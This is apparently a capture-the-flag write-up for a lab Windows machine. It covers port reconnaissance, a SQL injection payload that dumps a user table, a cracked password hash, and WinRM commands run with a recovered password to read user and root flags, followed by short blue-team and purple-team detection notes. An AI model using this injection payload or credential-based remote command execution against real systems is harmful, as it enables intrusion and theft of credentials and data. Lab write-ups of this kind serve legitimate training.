Target : 10.129.76.39

Date : 14/10/2026

`88` and `389` are open, the domain is `htb.local`, and the host is `Rabbit.htb.local`. Port `80` is IIS and it answers `403`. The service that talks is Apache on `8080`.

```bash
> curl -sI http://10.129.76.39:8080/complain/
```

We've got a `302` to `/complain/login.php`. We register a customer, log in, and the report view trusts `mod` from the query. `mod=admin` with `id=plans UNION SELECT 1,2,3,group_concat(Username,0x3a,Password),5 FROM secret.users` prints the table. Ariel's hash `b9c2538d92362e0e18e52d0ee9ca0c6f` is `pussycatdolls`. Raziel's hash does not match the string the attachment task is said to use, so we ask WinRM.

```bash
> nxc winrm 10.129.76.39 -u raziel -p '6OJ2eFeyalD4H6den2i' -d htb.local -x 'whoami /groups & type C:\Users\Raziel\Desktop\user.txt'
```

We've got `htb\raziel` in `BUILTIN\Administrators`, and `c6f45142bea818fe729cef32342aae9c`.

```bash
> nxc winrm 10.129.76.39 -u raziel -p '6OJ2eFeyalD4H6den2i' -d htb.local -x 'type C:\Users\Administrator\Desktop\root.txt'
```

We've got `0b2ded66e5a49dd1620be30110f43d54`.

**Blue Team :**
`5985` is the door. A type 3 logon for `htb\raziel` followed by `cmd.exe` reading `C:\Users\Raziel\Desktop\user.txt` and then `C:\Users\Administrator\Desktop\root.txt` is the whole chain. The group that made the second read legal is `BUILTIN\Administrators` on `RABBIT`, visible in the same token.

**Purple Team :**
We skipped the OpenOffice macro. The password on the attachment job was already a WinRM password, and that account was already a local admin, so both desktops were one command and the phish never had to land.
